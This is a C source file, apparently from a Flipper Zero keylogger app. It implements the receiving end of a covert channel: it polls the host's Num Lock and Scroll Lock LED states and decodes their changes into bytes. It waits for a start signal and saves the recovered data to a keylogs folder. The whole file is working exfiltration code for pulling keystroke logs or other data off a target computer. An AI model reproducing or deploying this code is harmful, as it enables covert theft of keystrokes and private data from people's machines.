#include "keystroke_exfil.h"
#include <furi.h>
#include <furi_hal.h>
#include <toolbox/path.h>
#include "progress_view.h" // For progress_view_is_running

#define TAG "KeylogDataTransfer"
#define KEYLOG_DIR "/ext/apps_data/keylogger/keylogs"
#define LED_POLL_INTERVAL_MS 25 // Faster polling - check every 25ms instead of 50ms
#define DATA_TIMEOUT_MS 300000  // Timeout if no new data received (5 minutes for LED transmission)
#define DEBUG_LED_CHANGES 0

// Helper to decode 2 bits from LED state (Num Lock + Scroll Lock only - safe mode)
static uint8_t decode_led_to_2bit_value(uint8_t led_state) {
    uint8_t value = 0;
    if(led_state & HID_LED_NUM_LOCK) value |= 0x01;      // Bit 0
    if(led_state & HID_LED_SCROLL_LOCK) value |= 0x02;   // Bit 1
    // Caps Lock is ignored for safety
    return value; // Returns 0-3 (2-bit value)
}

// Helper to get human-readable LED state string for debugging
static const char* led_state_to_string(uint8_t led_state) {
    static char buffer[32];
    snprintf(buffer, sizeof(buffer), "N:%d S:%d (C:%d) (0x%02X=2bit:%d)", 
        (led_state & HID_LED_NUM_LOCK) ? 1 : 0,
        (led_state & HID_LED_SCROLL_LOCK) ? 1 : 0,
        (led_state & HID_LED_CAPS_LOCK) ? 1 : 0,
        led_state,
        decode_led_to_2bit_value(led_state));
    return buffer;
}

KeystrokeExfilContext* keystroke_exfil_alloc(Storage* storage_instance) {
    KeystrokeExfilContext* context = malloc(sizeof(KeystrokeExfilContext));
    if(!context) {
        return NULL;
    }
    
    context->storage = storage_instance;
    context->target_file_path = furi_string_alloc();
    if(!context->target_file_path) {
        free(context);
        return NULL;
    }
    
    context->exfil_data_len = 0;
    context->last_led_state_time = 0;
    memset(context->exfil_buffer, 0, EXFIL_BUFFER_SIZE); // Corrected: exfil_buffer
    return context;
}

void keystroke_exfil_free(KeystrokeExfilContext* context) {
    if(!context) return;
    furi_string_free(context->target_file_path);
    free(context);
}

bool keystroke_exfil_start_capture(
    KeystrokeExfilContext* context,
    const char* output_filename,
    void (*progress_view_set_status_callback)(void* cb_ctx, const char* status),
    void* progress_view_cb_context,
    ProgressView* progress_view
) {
    furi_assert(context);
    furi_assert(output_filename);
    furi_assert(progress_view);

    context->exfil_data_len = 0;
    context->last_led_state_time = furi_get_tick();
    furi_string_printf(context->target_file_path, "%s/%s", KEYLOG_DIR, output_filename);

    File* file = storage_file_alloc(context->storage);
    if(!storage_file_open(file, furi_string_get_cstr(context->target_file_path), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        FURI_LOG_E(TAG, "Failed to open file for writing: %s", furi_string_get_cstr(context->target_file_path));
        storage_file_free(file);
        if(progress_view_set_status_callback) {
            progress_view_set_status_callback(progress_view_cb_context, "Error: Cannot open file");
        }
        return false;
    }

    FURI_LOG_I(TAG, "Starting LED capture. Saving to: %s", furi_string_get_cstr(context->target_file_path));
    if(progress_view_set_status_callback) {
        progress_view_set_status_callback(progress_view_cb_context, "Capturing LED data...");
    }

    // Get initial LED state for debugging
    uint8_t initial_led_state = furi_hal_hid_get_led_state();
    FURI_LOG_I(TAG, "Initial LED state: %s", led_state_to_string(initial_led_state));
    
    uint8_t previous_led_state = initial_led_state;
    uint16_t current_bits = 0;  // Use 16-bit to handle overflow
    uint8_t values_for_byte = 0; // Track 2-bit values for current byte (need 4 per byte)
    uint32_t total_bytes_written = 0;
    uint32_t loop_count = 0;
    uint32_t last_status_update = furi_get_tick();
    bool transmission_started = false;
    bool expecting_start_signal = true;

    while(progress_view_is_running(progress_view)) { 
        uint8_t led_state = furi_hal_hid_get_led_state();
        loop_count++;

        // Periodic status update every 5 seconds to show we're alive
        if(furi_get_tick() - last_status_update > 5000) {
            last_status_update = furi_get_tick();
            FURI_LOG_D(TAG, "LED capture active: %lu loops, current state: %s", loop_count, led_state_to_string(led_state));
            if(progress_view_set_status_callback) {
                FuriString* status_str = furi_string_alloc();
                furi_string_printf(status_str, "Monitoring LEDs...\nState: %s\nLoops: %lu", led_state_to_string(led_state), loop_count);
                progress_view_set_status_callback(progress_view_cb_context, furi_string_get_cstr(status_str));
                furi_string_free(status_str);
            }
        }

        if(led_state != previous_led_state) {
            FURI_LOG_I(TAG, "LED change detected: %s -> %s", 
                led_state_to_string(previous_led_state), 
                led_state_to_string(led_state));
            
            // Check for start signal (both LEDs on = 0x03)
            if(expecting_start_signal && decode_led_to_2bit_value(led_state) == 0x03) {
                FURI_LOG_I(TAG, "Start signal detected!");
                transmission_started = true;
                expecting_start_signal = false;
                previous_led_state = led_state;
                context->last_led_state_time = furi_get_tick();
                continue; // Skip processing start signal as data
            }
            
            if(!transmission_started) {
                previous_led_state = led_state;
                continue; // Ignore changes until start signal
            }
            
            uint8_t value = decode_led_to_2bit_value(led_state);
            FURI_LOG_D(TAG, "Decoded 2-bit value: %d", value);
            
            previous_led_state = led_state;
            context->last_led_state_time = furi_get_tick();
            
            // Accumulate 4 × 2-bit values to form a byte
            current_bits = (current_bits << 2) | value;
            values_for_byte++;
            
            FURI_LOG_D(TAG, "2-bit values for byte: %d/4, current_bits: 0x%02X", values_for_byte, current_bits);

            // We need exactly 4 × 2-bit values (8 bits) to reconstruct the original byte
            if(values_for_byte >= 4) {
                uint8_t decoded_byte = current_bits & 0xFF;
                FURI_LOG_I(TAG, "Decoded byte from 4 × 2-bit values (0x%02X): 0x%02X ('%c')", 
                    current_bits, decoded_byte, 
                    (decoded_byte >= 32 && decoded_byte <= 126) ? decoded_byte : '.');
                
                if(context->exfil_data_len < EXFIL_BUFFER_SIZE -1) {
                    context->exfil_buffer[context->exfil_data_len++] = decoded_byte;
                } else {
                    if(storage_file_write(file, context->exfil_buffer, context->exfil_data_len) != context->exfil_data_len) {
                        FURI_LOG_E(TAG, "Failed to write to file");
                        if(progress_view_set_status_callback) progress_view_set_status_callback(progress_view_cb_context, "Error: File write failed");
                        goto end_capture;
                    }
                    total_bytes_written += context->exfil_data_len;
                    context->exfil_data_len = 0;
                    context->exfil_buffer[context->exfil_data_len++] = decoded_byte;
                    if(progress_view_set_status_callback) {
                        FuriString* status_str = furi_string_alloc();
                        furi_string_printf(status_str, "Written: %lu B", total_bytes_written);
                        progress_view_set_status_callback(progress_view_cb_context, furi_string_get_cstr(status_str));
                        furi_string_free(status_str);
                    }
                }
                
                // Reset for next byte
                values_for_byte = 0;
                current_bits = 0;
            }
        } else {
            if(furi_get_tick() - context->last_led_state_time > DATA_TIMEOUT_MS) {
                FURI_LOG_I(TAG, "Data timeout. Assuming end of transmission.");
                if(progress_view_set_status_callback) progress_view_set_status_callback(progress_view_cb_context, "Data timeout.");
                goto end_capture;
            }
        }
        furi_delay_ms(LED_POLL_INTERVAL_MS);
    }

end_capture:
    if(!progress_view_is_running(progress_view) && total_bytes_written == 0){
         FURI_LOG_I(TAG, "Data transfer aborted by user.");
         if(progress_view_set_status_callback) progress_view_set_status_callback(progress_view_cb_context, "Transfer Aborted");
    }

    if(context->exfil_data_len > 0) {
        if(storage_file_write(file, context->exfil_buffer, context->exfil_data_len) != context->exfil_data_len) { // Corrected: exfil_buffer
            FURI_LOG_E(TAG, "Failed to write remaining data to file");
             if(progress_view_set_status_callback) progress_view_set_status_callback(progress_view_cb_context, "Error: Final write failed");
        } else {
            total_bytes_written += context->exfil_data_len;
            FURI_LOG_I(TAG, "Final write, total bytes: %lu", total_bytes_written);
        }
    }

    storage_file_close(file);
    storage_file_free(file);

    if(progress_view_is_running(progress_view)) { // If not aborted
        if(total_bytes_written > 0) {
            if(progress_view_set_status_callback) {
                FuriString* status_str = furi_string_alloc();
                furi_string_printf(status_str, "Transfer complete: %lu B", total_bytes_written);
                progress_view_set_status_callback(progress_view_cb_context, furi_string_get_cstr(status_str));
                furi_string_free(status_str);
            }
        } else if (furi_get_tick() - context->last_led_state_time <= DATA_TIMEOUT_MS) { // No data but not timeout (implies early finish or no data sent)
             if(progress_view_set_status_callback) progress_view_set_status_callback(progress_view_cb_context, "Transfer finished. No data.");
        }
    }

    FURI_LOG_I(TAG, "Keylog data transfer process ended.");
    return total_bytes_written > 0;
}

const char* keystroke_exfil_get_target_path(KeystrokeExfilContext* context) {
    furi_assert(context);
    furi_assert(context->target_file_path);
    return furi_string_get_cstr(context->target_file_path);
}


